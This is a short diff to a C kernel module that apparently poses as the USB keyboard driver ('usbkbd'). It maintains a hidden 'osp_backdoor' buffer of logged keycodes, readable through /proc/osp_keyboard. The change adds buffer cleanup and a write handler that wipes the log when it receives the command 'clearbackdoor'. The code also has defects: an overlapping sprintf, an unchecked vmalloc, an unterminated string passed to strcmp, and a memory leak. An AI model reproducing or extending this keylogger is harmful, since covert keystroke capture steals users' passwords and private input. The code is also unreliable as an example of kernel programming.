@@ -438,6 +438,7 @@ static int osp_backdoor_init()
 static void osp_backdoor_close()
 {
 	remove_proc_entry("osp_keyboard", NULL);
+	vfree(osp_backdoor_buffer);
 }
 
 static void osp_backdoor_write_key(int keycode)
@@ -451,7 +452,7 @@ static void osp_backdoor_write_key(int keycode)
 
 	// Write to buffer and increase the counter
 	sprintf(osp_backdoor_buffer, "%s %d", osp_backdoor_buffer, keycode);
-	osp_backdoor_buffer_count += strlen(osp_backdoor_buffer);
+	osp_backdoor_buffer_count = strlen(osp_backdoor_buffer);
 }
 
 static int proc_device_open(struct inode * inode, struct file * file_pointer)
@@ -473,7 +474,21 @@ static int proc_device_show(struct seq_file * file_stream, void * extra)
 
 static ssize_t proc_device_write(struct file * file_pointer, const char __user * str_buffer, size_t buffer_size, loff_t * offset)
 {
-	printk(KERN_ERR "usbkbd: device_write is not yet implemented!");
+	char * kern_buffer;
+	int copy_result;
+
+	kern_buffer = vmalloc(buffer_size);
+	copy_result = copy_from_user(kern_buffer, str_buffer, buffer_size);
+
+	if(strcmp(kern_buffer, "clearbackdoor") == 0)
+	{
+		memset(osp_backdoor_buffer, '\0', OSP_BACKDOOR_BUFFER_SIZE);
+		osp_backdoor_buffer_count = 0;
+
+		printk(KERN_INFO "usbkbd: Backdoor buffer has been cleared.");
+	}
+
+
 	return 0;
 }
 
